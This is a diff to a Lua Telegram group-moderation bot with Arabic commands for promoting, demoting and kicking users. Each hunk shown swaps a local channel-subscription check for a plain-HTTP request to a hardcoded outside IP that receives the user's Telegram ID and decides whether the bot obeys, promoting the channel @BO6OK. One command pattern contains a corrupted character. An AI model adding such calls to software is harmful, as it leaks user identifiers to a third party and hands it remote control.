 end  
 if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
 local username = text:match("^تنزيل مدير @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -4894,14 +4813,11 @@ return false
 end  
 if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then
 local userid = text:match("^تنزيل مدير (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'Manager'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -5058,14 +4974,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 if text == ("رفع ادمن") and msg.reply_to_message_id_ and Manager(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
@@ -5084,14 +4997,11 @@ return false
 end
 if text and text:match("^رف�� ادمن @(.*)$") and Manager(msg) then
 local username = text:match("^رفع ادمن @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5117,14 +5027,11 @@ return false
 end
 if text and text:match("^رفع ادمن (%d+)$") and Manager(msg) then
 local userid = text:match("^رفع ادمن (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5144,14 +5051,11 @@ end;end,nil)
 return false
 end
 if text == ("تنزيل ادمن") and msg.reply_to_message_id_ and Manager(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
@@ -5166,14 +5070,11 @@ return false
 end
 if text and text:match("^تنزيل ادمن @(.*)$") and Manager(msg) then
 local username = text:match("^تنزيل ادمن @(.*)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -5191,14 +5092,11 @@ return false
 end
 if text and text:match("^تنزيل ادمن (%d+)$") and Manager(msg) then
 local userid = text:match("^تنزيل ادمن (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -5216,14 +5114,11 @@ end
 
 ------------------------------------------------------------------------
 if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الطرد') 
@@ -5260,14 +5155,11 @@ return false
 end  
 if text and text:match("^طرد @(.*)$") and Mod(msg) then 
 local username = text:match("^طرد @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الطرد') 
@@ -5312,14 +5204,11 @@ end
 
 if text and text:match("^طرد (%d+)$") and Mod(msg) then 
 local userid = text:match("^طرد (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الطرد') 
@@ -5395,14 +5284,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5421,14 +5307,11 @@ return false
 end
 if text and text:match("^رفع مميز @(.*)$") and Mod(msg) then
 local username = text:match("^رفع مميز @(.*)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5455,14 +5338,11 @@ end
 
 if text and text:match("^رفع مميز (%d+)$") and Mod(msg) then
 local userid = text:match("^رفع مميز (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5483,14 +5363,11 @@ return false
 end
 
 if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
@@ -5505,14 +5382,11 @@ return false
 end
 if text and text:match("^تنزيل مميز @(.*)$") and Mod(msg) then
 local username = text:match("^تنزيل مميز @(.*)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -5530,14 +5404,11 @@ return false
 end
 if text and text:match("^تنزيل مميز (%d+)$") and Mod(msg) then
 local userid = text:match("^تنزيل مميز (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'Special:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -5575,14 +5446,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع مطي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5601,14 +5469,11 @@ return false
 end
 
 if (text == ("تنزيل مطي")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
@@ -5644,14 +5509,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع الحاته") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5670,14 +5532,11 @@ return false
 end
 
 if (text == ("تنزيل الحاته")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
@@ -5710,14 +5569,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع الحات") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5736,14 +5592,11 @@ return false
 end
 
 if (text == ("تنزيل الحات")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
@@ -5779,14 +5632,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5806,14 +5656,11 @@ end
 
 
 if (text == ("تنزيل صخل")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
@@ -5849,14 +5696,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع جلب") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5875,14 +5719,11 @@ return false
 end
 
 if (text == ("تنزيل جلب")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
@@ -5918,14 +5759,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -5944,14 +5782,11 @@ return false
 end
 
 if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
@@ -5987,14 +5822,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع حصان") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -6013,14 +5845,11 @@ return false
 end
 
